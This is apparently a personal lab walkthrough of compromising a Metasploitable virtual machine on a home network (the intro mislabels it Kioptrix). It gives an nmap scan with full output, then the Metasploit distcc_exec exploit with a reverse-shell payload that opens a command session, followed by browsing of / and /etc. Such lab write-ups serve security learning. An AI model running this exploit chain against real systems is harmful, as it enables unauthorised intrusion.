## **Step 1: Reconnaissance**

Before attacking, we need to gather information about the target.

### **1.1 Network Discovery**

First, identify the IP address of the Kioptrix machine on the network:

bash

```bash
netdiscover -r 192.168.1.0/24
```

As i run the above command i finally get my Machine **IP**.

**==192.168.1.74   08:00:27:bf:5f:4b      1      42  PCS Systemtechnik GmbH

### **1.2 Port Scanning with Nmap**

Perform an Nmap scan to discover open ports and services:

```bash
nmap -v -sV -sC -O -T4 -p- -A -oA /home/arjun/"Nmap Output"/Meta-1 192.168.1.74
```

##### **OUTPUT:**
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.1
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9:ad90:6c8f:2f73:74af:383b:2540:8828
|_SHA-1: ed09:3088:7066:03bf:d5dc:2373:99b4:98da:2d4d:31c6
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: 2025-08-28T10:21:11+00:00; +2s from scanner time.
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 9
|   Capabilities flags: 43564
|   Some Capabilities: ConnectWithDatabase, LongColumnFlag, SupportsTransactions, SwitchToSSLAfterHandshake, SupportsCompression, Support41Auth, Speaks41ProtocolNew
|   Status: Autocommit
|_  Salt: #95<m4V7PkJqw%N9pMm^
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9:ad90:6c8f:2f73:74af:383b:2540:8828
|_SHA-1: ed09:3088:7066:03bf:d5dc:2373:99b4:98da:2d4d:31c6
|_ssl-date: 2025-08-28T10:21:11+00:00; +2s from scanner time.
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/5.5
|_http-favicon: Apache Tomcat

## **Step 2: Exploitation**

Now, let's exploit This machine by using,  distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)).

I have used Metasploit tool to exploit the above version. steps are as follows.

1. Started Metasploit console in root user.

```bash
msfconsole
```

2. Search the above exploit distcc. (search result exploit below)

```bash
msf> search distcc

Matching Modules
================

   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec

```

3. Using the exploit founded by metasploit, By the following command. (exploit  chosen below)

```bash
msf > use exploit/unix/misc/distcc_exec
```

4. search options for the following exploit, this will give us the list of options to be set compulsory in the exploit. as shown below.

```bash
Module options (exploit/unix/misc/distcc_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.8      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

```

5. Now we will set RHOSTS  (Target IP). As the only compulsory option empty was RHOSTS.

```bash
msf exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.1.74
RHOSTS => 192.168.1.74
msf exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS   192.168.1.74     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.8      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

```

6. Now we have to set the payload for the exploit we are using for the reverse shell.

```bash
msf exploit(unix/misc/distcc_exec) > set payload payload/cmd/unix/reverse
payload => cmd/unix/reverse
```

7. As you can see above the payload has been set successfully. Now we will run the exploit and we will get the reverse shell. As shown below.

```bash
msf exploit(unix/misc/distcc_exec) > run
[*] Started reverse TCP double handler on 192.168.1.8:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo ad1K8FELlgVEb6K4;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "ad1K8FELlgVEb6K4\r\n"
[*] Matching...
[*] B is input...
ls
[*] Command shell session 1 opened (192.168.1.8:4444 -> 192.168.1.74:46695) at 2025-09-08 11:40:50 +0530

4546.jsvc_up
cd ..

ls 
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
cd /etc     
ls
X11
adduser.conf
adjtime
aliases
aliases.db
alternatives
apache2
apm
apparmor
apparmor.d
apt
at.deny
bash.bashrc
bash_completion
bash_completion.d
belocs
bind
bindresvport.blacklist
blkid.tab
blkid.tab.old
calendar
chatscripts
console-setup
console-tools
cowpoke.conf
cron.d
cron.daily
cron.hourly
cron.monthly
cron.weekly
crontab
cups
debconf.conf
debian_version
default
defoma
deluser.conf
depmod.d
devscripts.conf
dhcp3
distcc
dpkg
e2fsck.conf
emacs
environment
event.d
fdmount.conf
fonts
fstab
ftpchroot
ftpusers
fuse.conf
gai.conf
gdm
groff
group
group-
grub.d
gshadow
gshadow-
gtk-2.0
hdparm.conf
host.conf
hostname
hosts
hosts.allow
hosts.deny
inetd.conf
init.d
initramfs-tools
inputrc
iproute2
issue
issue.net
java
jvm
jvm.d
kernel-img.conf
ld.so.cache
ld.so.conf
ld.so.conf.d
ldap
locale.alias
localtime
logcheck
login.defs
logrotate.conf
logrotate.d
lsb-base
lsb-base-logging.sh
lsb-release
ltrace.conf
lvm
magic
magic.mime
mailcap
mailcap.order
mailname
manpath.config
mediaprm
mime.types
mke2fs.conf
modprobe.d
modules
motd
motd.tail
mtab
mysql
nanorc
network
networks
nsswitch.conf
opt
pam.conf
pam.d
pango
passwd
passwd-
pcmcia
perl
php5
popularity-contest.conf
postfix
postgresql
postgresql-common
ppp
printcap
profile
profile.d
proftpd
protocols
python
python2.5
rc.local
rc0.d
rc1.d
rc2.d
rc3.d
rc4.d
rc5.d
rc6.d
rcS.d
resolv.conf
resolvconf
rmt
rpc
samba
screenrc
securetty
security
services
sgml
shadow
shadow-
shells
skel
ssh
ssl
sudoers
sysctl.conf
syslog.conf
terminfo
timezone
tomcat5.5
ucf.conf
udev
ufw
update-manager
updatedb.conf
vim
w3m
wgetrc
wpa_supplicant
xinetd.conf
xinetd.d
```

